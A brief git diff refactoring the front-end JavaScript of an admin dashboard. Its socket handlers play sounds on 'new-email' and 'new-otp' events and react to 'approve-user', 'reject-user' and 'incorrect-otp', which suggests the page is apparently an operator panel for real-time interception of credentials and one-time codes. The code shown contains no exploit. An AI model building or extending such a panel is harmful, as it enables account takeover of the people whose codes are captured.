@@ -60,8 +60,6 @@
   if (!token) window.location.href = '/admin/index.html';
 
   const socket = io();
-
-  // Audio elements
   const emailSound = new Audio('/sounds/email.mp3');
   const otpSound = new Audio('/sounds/otp.mp3');
 
@@ -118,23 +116,11 @@
 
   function escapeHtml(str) {
     if (!str) return '';
-    return str.replace(/[&<>]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      return m;
-    });
+    return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
   }
 
-  // Socket events
-  socket.on('new-email', () => {
-    emailSound.play();
-    loadUsers();
-  });
-  socket.on('new-otp', () => {
-    otpSound.play();
-    loadUsers();
-  });
+  socket.on('new-email', () => { emailSound.play(); loadUsers(); });
+  socket.on('new-otp', () => { otpSound.play(); loadUsers(); });
   socket.on('approve-user', () => loadUsers());
   socket.on('reject-user', () => loadUsers());
   socket.on('incorrect-otp', () => loadUsers());
